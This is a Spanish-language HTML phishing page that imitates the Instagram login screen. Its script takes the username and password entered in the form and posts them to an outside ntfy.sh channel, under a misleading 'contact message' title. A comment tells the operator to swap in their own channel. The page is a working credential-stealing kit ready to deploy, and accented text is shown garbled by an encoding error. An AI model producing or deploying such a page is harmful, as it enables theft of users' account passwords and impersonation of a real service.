<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <style>
    body {
      background-color: #fafafa;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      width: 350px;
      padding: 40px;
      background-color: #fff;
      border: 1px solid #dbdbdb;
      text-align: center;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
    }

    .container img {
      margin-bottom: 30px;
      width: 175px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 5px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background-color: #fafafa;
    }

    .btn-login {
      margin-top: 10px;
      background-color: #3897f0;
      border: none;
      color: white;
      font-weight: bold;
      cursor: pointer;
      padding: 10px;
    }

    .btn-login:hover {
      background-color: #318ce7;
    }

    .separator {
      margin: 20px 0;
      display: flex;
      align-items: center;
      text-align: center;
    }

    .separator::before,
    .separator::after {
      content: "";
      flex: 1;
      border-bottom: 1px solid #dbdbdb;
    }

    .separator:not(:empty)::before {
      margin-right: .75em;
    }

    .separator:not(:empty)::after {
      margin-left: .75em;
    }

    .fb-login {
      color: #385185;
      font-weight: bold;
      text-decoration: none;
      display: block;
      margin: 15px 0;
    }

    .forgot {
      color: #00376b;
      font-size: 12px;
      text-decoration: none;
    }

    .signup {
      margin-top: 20px;
      font-size: 14px;
    }

    .signup a {
      color: #3897f0;
      text-decoration: none;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" />
    <form id="loginForm">
      <input type="text" name="username" id="username" placeholder="Tel√©fono, usuario o correo electr√≥nico" required />
      <input type="password" name="password" id="password" placeholder="Contrase√±a" required />
      <button type="submit" class="btn-login">Iniciar sesi√≥n</button>
    </form>

    <div class="separator">O</div>

    <a href="#" class="fb-login">Iniciar sesi√≥n con Facebook</a>
    <a href="#" class="forgot">¬øOlvidaste tu contrase√±a?</a>

    <div class="signup">
      ¬øNo tienes una cuenta? <a href="#">Reg√≠strate</a>
    </div>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function (event) {
      event.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      const mensaje = `üì• Nuevo login:\nüë§ Usuario: ${username}\nüîí Contrase√±a: ${password}`;

      fetch("https://ntfy.sh/USER_BYN9", { // üîÅ CAMBIA ESTO POR TU CANAL REAL
        method: "POST",
        body: mensaje,
        headers: {
          "Title": "Nuevo mensaje de contacto",
          "Priority": "high"
        }
      })
      .then(response => {
        if (response.ok) {
          alert("‚úÖ Mensaje enviado con √©xito.");
        } else {
          alert("‚ùå Error al enviar.");
        }
      })
      .catch(error => {
        alert("‚ùå Error al enviar: " + error.message);
      });
    });
  </script>

</body>
</html>
